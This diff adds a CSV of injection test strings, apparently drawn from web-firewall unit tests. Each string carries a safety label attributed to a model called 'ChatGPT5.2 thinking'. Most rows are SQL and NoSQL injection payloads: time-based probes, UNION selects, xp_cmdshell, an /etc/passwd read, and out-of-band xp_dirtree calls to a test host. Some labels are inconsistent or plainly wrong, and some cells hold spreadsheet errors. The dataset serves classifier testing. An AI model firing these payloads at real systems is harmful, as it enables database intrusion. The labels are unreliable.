@@ -1,0 +1,729 @@
+string,classification,Model
+var=1234OR1=1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=-1839'or'1'='1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=-1839""or""1""=""2",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=2010-01-01'+sleep(20.to_i)+' ,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=EmptyValue'and526=527,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=foo')UNIONALLselectNULL--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=foo')waitfor delay'5:0:20'--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=JKGHUKGDI8TDHLFJH72FZLFJSKFH'andsleep(12)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=/path/to/file/unitests.txt')UNIONALLselectNULL--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"1'||(selectextractvalue(xmltype('<?xmlversion=""1.1""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%toyopSYSTEM""https://coreruleset.org/"">%toyop;",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=sleep(20),Malicious-Unsafe,ChatGPT5.2 thinking
+"var=unittests@coreruleset.org""sleep(10.to_i)""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=""|type%SystemDrive%\\config.ini|""",Safe,ChatGPT5.2 thinking
+"var=""unittests@coreruleset.org""'))and(select*from(select(sleep(5)))x)--",Malicious-Unsafe,ChatGPT5.2 thinking
+/1234 OR 1=1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/2010-01-01'+sleep(20.to_i)+' ,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/EmptyValue' and 526=527,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/foo')waitfor delay'5:0:20'--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/sleep(20),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/unittests@coreruleset.org"" sleep(10.to_i) """,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/foo/24'union+all+select+1,2,3+from+aa",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/foo/24'union+all+select+1,2,3+from+aa/bar",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/*/*/2+union+all/bar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/foo/9'union+all/bar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/foo/24+union+all+select+1,2,3+from+aa/bar",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=blahblah&var2=LIKE NULL,Safe,ChatGPT5.2 thinking
+pay=RegExp,Safe,ChatGPT5.2 thinking
+>>,Safe,ChatGPT5.2 thinking
+pay=&&,Safe,ChatGPT5.2 thinking
+<<,Safe,ChatGPT5.2 thinking
+!=,Safe,ChatGPT5.2 thinking
+||,Safe,ChatGPT5.2 thinking
+XOR,Safe,ChatGPT5.2 thinking
+pay=<=,Safe,ChatGPT5.2 thinking
+ISNULL,Safe,ChatGPT5.2 thinking
+"in(0,1)",Safe,ChatGPT5.2 thinking
+"in(2147483647,-1)",Safe,ChatGPT5.2 thinking
+pay=<=>,Safe,ChatGPT5.2 thinking
+regexp,Safe,ChatGPT5.2 thinking
+RLIKE,Safe,ChatGPT5.2 thinking
+<>,Safe,ChatGPT5.2 thinking
++in+(++select+anfrage_id+from+erkenntnisse+where+id+is++not++null++),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"+IN+(815914,+815913)",Safe,ChatGPT5.2 thinking
+"+IN+(815919,+815920,+815921,+815922,+815923,+815924,+815925,+815926,+815927,+815928,+815929,+815930,+815932,+815933,+815934,+815935,+815936,+815937,+815917,+815918)",Safe,ChatGPT5.2 thinking
+"pay=in(Aa,-Ab-,andAc)",Safe,ChatGPT5.2 thinking
+>=,Safe,ChatGPT5.2 thinking
+select * from user where password_last_changed not between '2021-04-11' and '2021-04-11',Safe,ChatGPT5.2 thinking
+email=z'or email notnull--,Malicious-Unsafe,ChatGPT5.2 thinking
+email=x' or username like totpSecret escape 'x';,Malicious-Unsafe,ChatGPT5.2 thinking
+email=admin@juice-sh.op' and email ilike email--,Malicious-Unsafe,ChatGPT5.2 thinking
+email=admin@juice-sh.op' and email = all (select email)--,Malicious-Unsafe,ChatGPT5.2 thinking
+var=user'collate nocase--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=user'collate`nocase`--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=user'collate foo--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=user'collate`utf8mb4_general_ci`--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=user'collate""\utf8mb4_general_ci""--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=user'collateU&""$1#B#E#D""--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=' notnull --,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=admin@juice-sh.op'and unlikely (id)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+text=Itishighlyunlikelythisisgoingtobeafalsepositive,Safe,ChatGPT5.2 thinking
+"email=admin@juice-sh.op\' and( likelihood (id,.0));'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+text=Aftercalculatingthelikelihoodthisshouldnotbematched.,Safe,ChatGPT5.2 thinking
+/catalogue/rest/products/2499999||this.product/reviews,Safe,ChatGPT5.2 thinking
+"var=""1"" sSOUNDS LIKE ""SOUNDS LIKE 1&other_var=test",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/get?a=1=1,Safe,ChatGPT5.2 thinking
+/get?a=11=1,Safe,ChatGPT5.2 thinking
+/get?a=1=11,Safe,ChatGPT5.2 thinking
+/get?a=11!=11,Safe,ChatGPT5.2 thinking
+"/get?a=b,1=1",Safe,ChatGPT5.2 thinking
+a=42 like 42,Safe,ChatGPT5.2 thinking
+/get?a=This is like no other,Safe,ChatGPT5.2 thinking
+/get?a=42<=>42,Safe,ChatGPT5.2 thinking
+/?user=admin@juice-sh.op' and password glob password;,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/get?a=11!=1,Safe,ChatGPT5.2 thinking
+/get?a=1!=11,Safe,ChatGPT5.2 thinking
+/get?a=1 is not 2,Safe,ChatGPT5.2 thinking
+/get?a=1 is not 1,Safe,ChatGPT5.2 thinking
+a='1'notregexp'2',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+a='1'notregexp'1',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?sql_table=pg_catalog,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+INFORMATION_SCHEMA,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+database(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+db_name(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+tempdb,Safe,ChatGPT5.2 thinking
+msdb,Safe,ChatGPT5.2 thinking
+mysql.db,Safe,ChatGPT5.2 thinking
+MSysAccessObjects,Safe,ChatGPT5.2 thinking
+Northwind,Safe,ChatGPT5.2 thinking
+SCHEMA_NAME,Safe,ChatGPT5.2 thinking
+"var=SKLJDRTZWS89E450W49NQB0W45BN""=sleep(12)=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=1'andsleep(9)#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=1(select*from(select(sleep(5)))d),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=unittests@coreruleset.org'(function(){if(typeoffoo===""undefined""){vara=newDate();do{varb=newDate();}while(b-a<20000);foo=1;}}())'",Safe,ChatGPT5.2 thinking
+var=test')and(select*from(select(sleep(10)))d)--,Malicious-Unsafe,ChatGPT5.2 thinking
+var=config.ini'andsleep(91)#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=None')and(select*from(select(sleep(10)))a)--,Malicious-Unsafe,ChatGPT5.2 thinking
+"var=eval(compile('forxinrange(1):\nimporttime\ntime.sleep(12)','a','single'))",Safe,ChatGPT5.2 thinking
+var=file:/init.ini'.sleep(12).',Safe,ChatGPT5.2 thinking
+var=1)and(select*from(select(sleep(12)))a)--:1)and(select*from(select(sleep(12)))a)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=/path/to/file/config.ini')and(select*from(select(sleep(12)))a)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))},Safe,ChatGPT5.2 thinking
+var=test{${sleep(12)}},Safe,ChatGPT5.2 thinking
+"var=test""+eval(compile('forxinrange(1):\nimporttime\ntime.sleep(12)','a','single'))+""",Safe,ChatGPT5.2 thinking
+"var=test""+(function(){if(typeofgs78r==='undefined'){vara=newDate();do{varb=newDate();}while(b-a<20000);gs78r=1;}}())+""",Safe,ChatGPT5.2 thinking
+"var=\foobar.txt""orsleep(4)#",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=admin@juice-sh.op\' or json (id);,Malicious-Unsafe,ChatGPT5.2 thinking
+email=admin@juice-sh.op\' or json_valid (id);,Malicious-Unsafe,ChatGPT5.2 thinking
+"email=admin@juice-sh.op\' or glob (id,id);",Malicious-Unsafe,ChatGPT5.2 thinking
+"var=foo'||(selectextractvalue(xmltype('<?xmlversion=""1.1""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%tocobSYSTEM""https://unit'||'tests.coreruleset.org/"">%tocob;",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=/config.txt'(selectload_file('\\\\unittests.coreruleset.org\\zow'))',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=(selectload_file('\\\\\\\\\\\\\\\\unitests.corerule'||'set.org\\\\\\\\hvs')),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=,FIND_IN_SET('22',Category)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"email=1' + 1 is likelihood(0.0,0.0) is 1--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=admin@example.com' or sqlite_compileoption_used (id)--,Malicious-Unsafe,ChatGPT5.2 thinking
+email=admin@example.com'and not sqlite_compileoption_get (id)--,Malicious-Unsafe,ChatGPT5.2 thinking
+"/index.php?id=starts_with(password,'a')::int",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/index.php?id=jsonb_pretty(...(1,password)::jsonb)::int",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/index.php?id=...(json_build_object(1,password)::jsonb)::int",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?id=unistr(password)::int,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?sql_table=sleep(534543),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+sleEP(3),Malicious-Unsafe,ChatGPT5.2 thinking
+sleep(5000),Malicious-Unsafe,ChatGPT5.2 thinking
+"BENChmARk(2999/**/999,Md5(NoW()",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"BEncHMARk(2999999,Md5(NoW('')",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"BENCHMARK(5000000,MD5(0x48416166)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"benchmark(3000000,MD5(4)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=BENCHMARK(1000000,md5""AND1883=1883--GSCC('')",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=BeNChMaRK(1000000,md5AND9796=4706('')",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/if(now()=sysdate(),sleep(12),0)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/?var=SELECT BENCHMARK(1000000,1+1);",Malicious-Unsafe,ChatGPT5.2 thinking
+/?var=; sleep(0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=I sleep well!,Safe,ChatGPT5.2 thinking
+/?test=select+if(x,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=3' ' 1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"javascript:""/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html""",Safe,ChatGPT5.2 thinking
+/?var=';,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var='glob 1;,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=';print',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=';#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var='or(id glob 1)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var='or(glob 1)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var= exec xp_cmdshell,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"""!""",Safe,ChatGPT5.2 thinking
+"""union+select",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+current_user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+FROM+INFORMATION_SCHEMA.,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+';SELECT+P,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+UnIon+seleCt,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+'union select/,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"select]=polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,version(),user(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+select(user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"SeLect*/+1,2,3,user(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"select]=(ExtractValue(1,(select%20concat_ws(0x3a,user(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+from+`information_schema`,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+'select+H,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+#NAME?,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"""!+Y",Safe,ChatGPT5.2 thinking
+exec+master.,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+into+outfile+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+selectect%20user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+#NAME?,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+selectect%2520user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"execution=e1s1&OlyH=9767+AND+1=1+UNION+ALL+SELECT+1,NULL,'<script>alert(""XSS"")</script>',table_name+FROM+information_schema.tables+WHERE+2>1--/**/;+EXEC+xp_cmdshell",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+'!`,Safe,ChatGPT5.2 thinking
+""" UNION ALL SELECT",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+EXec+xp_cmdshell,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"select+1+FROM(select+count(*),concat((select+(select+concat(user(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+`!1,Safe,ChatGPT5.2 thinking
+uNioN++sElecT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+""";SELECT+P",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=UnIoN+SeLeCt,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=1);declare@qvarchar(99);set@q='\\j0kwbatxjfgjp0qu3ibonwovamgmkq8h05unittests.corerule''set.org\kph';execmaster.dbo.xp_dirtree@q;--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=content.ini);declare@qvarchar(99);set@q='\\i1kvc9uwkehiqzrt4hcnovpublhunittests.corerule''set.org\lri';execmaster.dbo.xp_dirtree@q;--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=EmptyValue','4','2','7');declare@qvarchar(99);set@q='\\h5nug8yvodlhuyvs8ggmsuttfklkcjunittests.corerule'+'set.org\vcr';execmaster.dbo.xp_dirtree@q;--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=test));declare@qvarchar(99);set@q='\\zwzc7qpdfvczlgmazy74jckb62cunittests.corrule'+'set.org\gej';execmaster.dbo.xp_dirtree@q;--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=@.:=right(right((select+user_login+from+wordpress.wp_users+limit+1,1),1111),1111)+union#",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+distinctrow select@.,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"arg=Die ""Union von Europa""",Safe,ChatGPT5.2 thinking
+"arg=SELECT IIF(1 > 1, 'TRUE', 'FALSE' )",Safe,ChatGPT5.2 thinking
+"arg=it is my beliif (stemming from personal experience), that",Safe,ChatGPT5.2 thinking
+"arg=appUser(sitename,user)",Safe,ChatGPT5.2 thinking
+",varname""=somedata",Safe,ChatGPT5.2 thinking
+var= @.= ( SELECT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=AND+2771=1709),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=;+insert+into,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=AND+7639=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=or+120=121=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=AND+deleted+=+0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=/Cm7+OR+,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=OR+(7319=8742),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=||(null!=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=and+1!=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=div+role=""",Safe,ChatGPT5.2 thinking
+"pay=div+id=""",Safe,ChatGPT5.2 thinking
+"pay=div+style=""",Safe,ChatGPT5.2 thinking
+pay=or+1=',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=AND+7829=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=AND+4372=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=;+UpdateUserTypeTracking,Safe,ChatGPT5.2 thinking
+pay=oR+pmw==,Safe,ChatGPT5.2 thinking
+pay=||+langCode+==+',Safe,ChatGPT5.2 thinking
+pay=||+c+==+',Safe,ChatGPT5.2 thinking
+pay=||+arg+==+',Safe,ChatGPT5.2 thinking
+pay=/Hmong_language+AND+,Safe,ChatGPT5.2 thinking
+pay=||+langCode+==,Safe,ChatGPT5.2 thinking
+pay=||+checker+==,Safe,ChatGPT5.2 thinking
+pay=&&+setPath+!=,Safe,ChatGPT5.2 thinking
+pay=;set+@,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=;update+users,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=and+1=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=/SPZwOaVcDWkrRly2aV01662fN+Or+,Safe,ChatGPT5.2 thinking
+pay=OR+CType=',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=1+OR+2+,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=>SET+@OLD_SQL_NOTES,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=;SET+@OLD_SQL_MODE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=;SET+@OLD_FOREIGN_KEY_CHECKS,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=;SET+@OLD_UNIQUE_CHECKS,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=;drop,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=+SET+@OLD_SQL_NOTES,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=@example.com&name=(select,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=@extension]=MmcDirectmailSubscription&tx_mmcdirectmailsubscription_subscr[__referrer][@vendor]=(SELECT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=@extension]=MmcDirectmailSubscription&tx_mmcdirectmailsubscription_subscr[__referrer][@vendor]=MMC&tx_mmcdirectmailsubscription_subscr[__referrer][@controller]=Subscribe&tx_mmcdirectmailsubscription_subscr[__referrer][@action]=register&tx_mmcdirectmailsubscription_subscr[__referrer][arguments]=YTowOnt98f5f75937bad1b56b6c736ef42e625647dab347d&tx_mmcdirectmailsubscription_subscr[__referrer][@request]=a:4:{s:10:&tx_mmcdirectmailsubscription_subscr[__trustedProperties]=a:4:{s:7:&tx_mmcdirectmailsubscription_subscr[address][firstName]=(SELECT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=and+object_type+=+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=/Business+and,Safe,ChatGPT5.2 thinking
+pay=AND+value+=+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=4AND4+,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=/3+or+,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=/3+and(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=/xxxx_R+AND+,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=/xxxx_R+or,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=1+GROUP+BY+CONCAT(0x716a787671,(SELECT+MID((IFNULL(CAST(a_1_18+AS+CHAR),0x20)),1,54)+FROM+db_justiz_daz.ugesundheit_antworten+ORDER+BY+id+LIMIT+571,1),0x7178716b71,FLOOR(RAND(0)*2))+HAVING+MIN(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=AND+backend_layout!=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=AND+uid!=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=and+1=1',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=&&(l=!0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=||(e+=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=&&(e===,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=&&(null==(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=&&(a=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=||(c=!1),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=&&(d!==,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=||(g=!0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=&&(e=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=&&(c=!0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=&&(f+=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=||(x=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=&&(b=0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=||(e===,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=||(c===,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=&&+1==(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=ORbackend_layout=',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=--alter,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=AND(name=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=ORname=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=4oR2-,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=ANDengine=',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=andcode!=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=andfreigabe=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=AND6698=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=orclass!=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=or4975==4975',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=1GROUPBYCONCAT(0x7162766a71,(SELECT(CASEWHEN(5554=5554)THEN1ELSE0END)),0x7171786271,FLOOR(RAND(0)*2))HAVINGMIN(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?string_to_convert=4294967296,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?i=2.2250738585072011e-308,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=) like (,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=)like(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=I like you!,Safe,ChatGPT5.2 thinking
+/?var= case when condition1 then result1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=having pain!,Safe,ChatGPT5.2 thinking
+/?var=SELECT x GROUP BY SOMETHING HAVING COUNT(Id) >= 9,Safe,ChatGPT5.2 thinking
+"/?var=SELECT * FROM `movies` GROUP BY `category_id`,`year_released` HAVING `category_id` = 8;",Safe,ChatGPT5.2 thinking
+/?var=behaving badly/,Safe,ChatGPT5.2 thinking
+/?var=o.havingu@gmail.com,Safe,ChatGPT5.2 thinking
+/?var=if(2=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=Just in case (abc),Safe,ChatGPT5.2 thinking
+/?var=if(1234=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
++WAITFOR+DELAY+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+;waitfor+delay+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+;WAITFOR+DELAY+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+';+waitfor+delay+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+'+waitfor+delay+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay="";waitfor+delay+'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=ALTER+TABLE+`mass_mails`+CHANGE+`receivers`+`receivers`+ENUM('FACILITIES','APPLICATION_2015','APPLICATION_2016')+CHARACTER+SET+utf8",Malicious-Unsafe,ChatGPT5.2 thinking
+ALTER+TABLE+`tx_v3appointment_domain_model_appointment`+ADD+`video`+TEXT+CHARACTER+SET+latin1,Malicious-Unsafe,ChatGPT5.2 thinking
+"/?var=EXECUTE IMMEDIATE """,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var= HAVING COUNT(CustomerID) > 5,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=having fun,Safe,ChatGPT5.2 thinking
+/?var=something LIKE ',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=union select col from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?test=Xunionselectfrom,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=select pg_sleep,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=""tester@coreruleset.org""'waitfordelay'0:0:20'--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/mongo/show.php?u_id[$ne]=2,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?mongoQ=[$lte]asdfsd,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/mongo/show.php?u_id[$regex]=2,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"{""$not"":""foo""}",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"{""$nor"":""foo""}",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"{""$where"":""foo""}",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"{""$elemMatch"":""foo""}",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"{""$text"":""foo""}",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=)when234then&foo=bar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=booked for 2021(including 2020,Safe,ChatGPT5.2 thinking
+"/?var=""' and = bar",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/?var=order by if(1=1,1,sleep(1))",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=procedure analyse (,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=exec+(@,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=declare+@b,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=DECLARE/**/@x,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?id=password::int,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?no=2&id=1' and unistr(password)::bool--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/index.php?id=div(23,-2)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/index.php?id=div+(23.23+,+2)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?id=lo_import('/etc' || '/pass' || 'wd'),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?id=lo_get(16400),MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?id=function(foo)::text,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?id=function(foo)::bigint,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?id=function(foo)::double precision,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=""'&var2=whatever",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=\""1or1-",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=\x23,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"""var=05111222333",Safe,ChatGPT5.2 thinking
+"andy.surname@somedomain.com""",Safe,ChatGPT5.2 thinking
+var=05111222333andy.surname@somedomain.com,Safe,ChatGPT5.2 thinking
+/?var=in ( select * from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/?var=except    select.1,2",MaliciousIntended-but-safe,ChatGPT5.2 thinking
